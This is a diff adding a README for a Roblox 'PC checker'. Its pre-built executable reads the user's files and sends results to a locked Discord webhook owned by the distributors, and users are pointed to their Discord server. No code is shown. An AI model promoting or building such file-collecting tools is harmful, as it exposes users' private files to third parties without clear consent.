@@ -1,0 +1,20 @@
+
+if u choose exe. here's our community for your pc checking outputs : https://discord.gg/pk6hvWENmv
+
+Roblox PC Checker
+- This tool is designed strictly for Roblox PC checking purposes only.
+
+Getting Started
+- Choose one of the two options below depending on your preference for running the tool:
+
+Option 1: Pre-compiled Application (Easiest)
+- Pros: Ready to run instantly with no Python installation required. It directly checks user files out of the box.
+
+- Cons: The webhook is locked, so you cannot change the destination directory within the application.
+
+Next Steps: Once you run the application, join our community to access your PC check directory and support: Discord Server.
+
+Option 2: Source Code (Maximum Security)
+- Pros: The safest method if you prefer not to use pre-built executables. You can review the code yourself and configure your own Discord webhook for the file check directory.
+
+- Cons: Requires downloading and installing Python (ensuring a compatible version), as well as manually installing all required modules one by one.
